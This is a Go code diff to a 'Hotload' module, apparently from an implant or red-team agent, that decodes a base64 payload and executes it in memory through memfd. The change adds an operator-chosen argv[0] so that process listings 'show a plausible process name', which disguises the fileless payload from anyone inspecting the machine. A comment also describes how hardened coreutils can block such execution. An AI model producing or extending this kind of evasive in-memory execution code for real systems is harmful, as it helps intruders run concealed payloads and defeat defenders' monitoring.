@@ -60,11 +60,20 @@ func (m *Hotload) Execute(ctx context.Context, args map[string]string) (*Result,
 		return nil, fmt.Errorf("exec_b64 decoded to empty payload")
 	}
 
+	// argv[0] is the program name the child sees. It is operator-controlled
+	// so ps output can show a plausible process name. Note that hardened
+	// userspace may reject memfd execution regardless of argv[0]: coreutils
+	// on Ubuntu 26.04+ validates argv[0] against /proc/self/exe (which reads
+	// as "/memfd: (deleted)") and exits with "Security violation".
+	argv0 := args["argv0"]
+	if argv0 == "" {
+		argv0 = "hotload"
+	}
+
 	var argv []string
+	argv = append(argv, argv0)
 	if argsStr := args["args_str"]; argsStr != "" {
-		// memexec expects the full argv vector: argv[0] is the program name
-		// the child sees, followed by its arguments.
-		argv = append([]string{"hotload"}, strings.Fields(argsStr)...)
+		argv = append(argv, strings.Fields(argsStr)...)
 	}
 
 	timeout := 60 * time.Second
